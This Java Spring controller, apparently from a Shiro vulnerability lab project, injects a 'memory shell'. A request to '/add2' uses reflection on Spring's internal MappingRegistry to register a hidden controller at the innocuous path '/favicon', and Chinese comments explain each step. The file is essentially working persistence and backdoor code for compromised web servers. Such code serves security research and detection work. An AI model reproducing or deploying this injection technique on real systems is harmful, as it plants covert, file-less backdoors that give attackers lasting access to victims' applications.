package com.shiro.vuln.Controller;

import com.shiro.vuln.util.ClassUtil;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.handler.AbstractHandlerMethodMapping;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

@Controller
public class AddShellController1 {
    @RequestMapping(value = "/add2")
    public void add(HttpServletRequest request, HttpServletResponse response){
        try {
            final String controllerPath = "/favicon";
            // first
//            WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();
            // second
//            WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());
            // third
//            WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());
            // fourth 从当前request属性中获取org.springframework.web.servlet.DispatcherServlet.CONTEXT, 其中对应的值为 AnnotationConfigServletWebServerApplicationContext
            WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            // fifth
//            WebApplicationContext context = RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());


            // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
            RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
            // 2. 通过反射获得自定义 controller 中唯一的 Method 对象
            Class<?> clazz = ClassUtil.getClass(ClassUtil.CONTROLLER_STRING);
            Method method = (clazz.getDeclaredMethods())[0];
            // 直接取MappingRegistry#register方法
            Field mapfield = AbstractHandlerMethodMapping.class.getDeclaredField("mappingRegistry");
            mapfield.setAccessible(true);
            Object mr = mapfield.get(r);
            Class<?> mrclazz = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry");
            Method mrms = mrclazz.getDeclaredMethod("register", Object.class, Object.class, Method.class);
//            Method[] mrmss = mrclazz.getDeclaredMethods();

            // 3. 定义访问 controller 的 URL 地址
            PatternsRequestCondition url = new PatternsRequestCondition(controllerPath);
            // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
            RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
            // 5. 在内存中动态注册 controller
            RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);

            mrms.setAccessible(true);
            mrms.invoke(mr, info, clazz.newInstance(), method);
//            for (Method mrms : mrmss){
//                if(mrms.getName().equals("register")){
//                    mrms.setAccessible(true);
//                    mrms.invoke(mr, info, clazz.newInstance(), method);
//                }
//            }


            response.getWriter().println("spring controller added");
        }catch (Exception e){
            e.printStackTrace();
        }

    }
}
